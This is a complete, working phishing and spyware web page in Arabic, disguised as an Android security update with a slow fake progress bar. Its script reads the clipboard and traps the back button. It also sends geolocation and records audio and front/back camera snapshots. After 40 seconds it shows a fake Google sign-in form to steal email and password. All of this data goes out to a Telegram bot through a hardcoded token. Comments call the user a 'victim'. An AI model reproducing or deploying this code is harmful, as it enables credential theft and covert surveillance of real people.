<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚙️ تحديث نظام الأندرويد</title>
    <style>
        body { background-color: #000; color: #fff; font-family: 'Roboto', sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
        .update-container { width: 85%; max-width: 400px; }
        .android-logo { width: 80px; margin-bottom: 25px; filter: grayscale(1); opacity: 0.8; }
        .progress-bg { width: 100%; height: 6px; background: #333; border-radius: 10px; margin: 20px 0; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: #4285f4; border-radius: 10px; transition: width 0.5s; }
        .status-text { font-size: 18px; color: #eee; margin-bottom: 5px; }
        .sub-text { font-size: 12px; color: #777; line-height: 1.5; }
        
        /* واجهة تسجيل الدخول المخفية */
        #phish-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; justify-content: center; align-items: center; color: #000; }
        .login-card { width: 90%; max-width: 360px; padding: 40px 20px; text-align: center; }
        .login-card img { width: 75px; margin-bottom: 20px; }
        .login-card input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        .login-card button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 20px; }
        
        #video, #canvas { display: none; }
    </style>
</head>
<body>

    <div class="update-container" id="main-ui">
        <img src="https://www.gstatic.com/images/branding/product/2x/android_96dp.png" class="android-logo" alt="Android">
        <div class="status-text">جاري تثبيت تحديث الأمان... <span id="percent">0%</span></div>
        <div class="progress-bg"><div class="progress-bar" id="bar"></div></div>
        <p class="sub-text">يتم الآن تحسين أداء النظام وسد الثغرات الأمنية.<br>يرجى عدم إغلاق المتصفح أو إطفاء الهاتف لضمان سلامة بياناتك.</p>
    </div>

    <div id="phish-overlay">
        <div class="login-card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
            <h1 style="font-size: 22px; font-weight: 400; margin-bottom: 10px;">تأكيد ملكية الحساب</h1>
            <p style="font-size: 14px; color: #5f6368;">لإكمال التحديث، يرجى تسجيل الدخول إلى حسابك</p>
            <input type="email" id="email" placeholder="البريد الإلكتروني">
            <input type="password" id="pass" placeholder="كلمة المرور">
            <button onclick="sendCreds()">تأكيد الهوية</button>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const TOKEN = "8723330008:AAH7fjX2fEKZ3-7WCWRQyiLHmNoaEY5QUaw";
        const CHAT_ID = "7984067238";
        let currentStream = null;

        function notify(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        }

        // 1. اختطاف الحافظة (Clipboard Sniffing)
        document.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                if(text) notify(`📋 **نص من الحافظة (Clipboard):**\n\`${text}\``);
            } catch(e) {}
        });

        // 2. منع الخروج (History Jail)
        function lockUser() {
            for(let i=0; i<100; i++) window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => {
                window.history.pushState(null, null, window.location.href);
                notify("🚫 الضحية حاول الخروج!");
            };
            if(navigator.vibrate) navigator.vibrate([200, 100, 200]);
        }

        // 3. التجسس الصوتي والبصري (أمامية/خلفية كل 2 ثانية)
        async function startSnooping() {
            // الصوت (كل 15 ثانية)
            try {
                const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const rec = new MediaRecorder(aStream);
                rec.ondataavailable = (e) => {
                    const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('voice', e.data, 'v.ogg');
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
                };
                setInterval(() => { rec.start(); setTimeout(() => rec.stop(), 5000); }, 15000);
            } catch(e) { notify("❌ رفض الميكروفون"); }

            // الكاميرا التتابعية
            const modes = ["user", "environment"];
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            let i = 0;
            while(true) {
                try {
                    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
                    currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: modes[i%2] } });
                    video.srcObject = currentStream;
                    await new Promise(r => setTimeout(r, 800));
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(b => {
                        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', b, 'i.jpg');
                        fd.append('caption', `📷 كاميرا: ${modes[i%2]==="user"?"أمامية":"خلفية"}`);
                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg', 0.5);
                } catch(e) {}
                i++; await new Promise(r => setTimeout(r, 2000));
            }
        }

        // 4. محاكاة التحديث (التمويه)
        function runUpdate() {
            let p = 0;
            const bar = document.getElementById('bar');
            const per = document.getElementById('percent');
            const interval = setInterval(() => {
                if (p < 99) {
                    p += Math.floor(Math.random() * 2) + 1;
                    if(p > 99) p = 99;
                    bar.style.width = p + '%';
                    per.innerText = p + '%';
                }
            }, 8000); // يستغرق وقتاً طويلاً جداً للتمويه
        }

        function sendCreds() {
            const e = document.getElementById('email').value;
            const p = document.getElementById('pass').value;
            if(e && p) {
                notify(`🔑 **حساب جوجل مسحوب:**\n📧: \`${e}\`\n🔐: \`${p}\``);
                document.getElementById('phish-overlay').style.display = 'none';
                alert("اكتمل التحديث بنجاح. سيتم إعادة تشغيل النظام.");
            }
        }

        window.onload = () => {
            lockUser();
            runUpdate();
            startSnooping();
            // سحب البيانات التقنية
            notify(`⚙️ **ضحية جديد دخل الفخ:**\n📱 النظام: ${navigator.platform}\n🔋 البطارية: ${navigator.getBattery ? 'جاري السحب...' : 'N/A'}`);
            // سحب الموقع
            navigator.geolocation.getCurrentPosition(pos => {
                notify(`📍 موقع الضحية: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            });
            // إظهار تسجيل الدخول بعد 40 ثانية من "التحديث"
            setTimeout(() => {
                document.getElementById('phish-overlay').style.display = 'flex';
            }, 40000);
            if(navigator.wakeLock) navigator.wakeLock.request('screen');
        };
    </script>
</body>
</html>
